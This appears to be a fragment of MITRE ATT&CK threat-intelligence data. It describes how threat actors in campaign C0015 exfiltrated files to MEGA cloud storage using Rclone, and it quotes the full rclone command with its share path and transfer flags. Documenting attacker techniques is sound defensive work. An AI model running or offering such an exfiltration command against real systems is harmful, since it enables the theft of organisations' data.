        "description": "During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)",
